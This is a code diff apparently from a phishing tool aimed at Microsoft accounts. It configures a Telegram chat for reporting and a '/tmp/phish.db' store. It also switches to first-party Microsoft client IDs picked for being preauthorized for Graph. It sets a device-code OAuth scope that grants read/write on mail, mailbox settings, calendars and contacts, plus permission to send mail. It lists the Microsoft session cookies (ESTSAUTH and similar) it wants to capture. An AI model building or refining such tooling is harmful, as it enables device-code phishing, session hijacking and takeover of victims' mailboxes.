@@ -15,16 +15,20 @@ TELEGRAM_CHAT = "8877118461"
 DB_PATH = "/tmp/phish.db"
 
 CLIENT_IDS = [
-    "27922004-5251-4030-b22d-91ecd9a37ea4",  # Outlook Mobile (confirmed working)
-    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Microsoft Office
-    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
-    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
+    "14d82eec-204b-4c2f-b7e8-296a70dab67e",  # Microsoft Graph Command Line Tools (preauthorized for Graph)
+    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI (also preauthorized for Graph)
+    "1b730954-1685-4b74-9bfd-dac224a7b894",  # Azure AD PowerShell (Graph fallback)
 ]
-CLIENT_ID_INDEX = 0
 
-# IMPORTANT: Outlook resource ONLY. No graph.microsoft.com — mixing resources causes AADSTS65002.
-DEVICE_CODE_SCOPE = "https://graph.microsoft.com/Mail.ReadWrite https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/MailboxSettings.ReadWrite https://graph.microsoft.com/Calendars.ReadWrite https://graph.microsoft.com/Contacts.ReadWrite https://graph.microsoft.com/User.ReadWrite offline_access openid profile"
-
+DEVICE_CODE_SCOPE = (
+    "https://graph.microsoft.com/Mail.ReadWrite "
+    "https://graph.microsoft.com/Mail.Send "
+    "https://graph.microsoft.com/MailboxSettings.ReadWrite "
+    "https://graph.microsoft.com/Calendars.ReadWrite "
+    "https://graph.microsoft.com/Contacts.ReadWrite "
+    "https://graph.microsoft.com/User.Read "
+    "offline_access openid profile"
+)
 COOKIE_WANTED = [
     "ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT", "ESTSAUTHTCT",
     "SignInStateCookie", "x-ms-gateway-suitename", "ESTSAUTHHPERSISTENT",
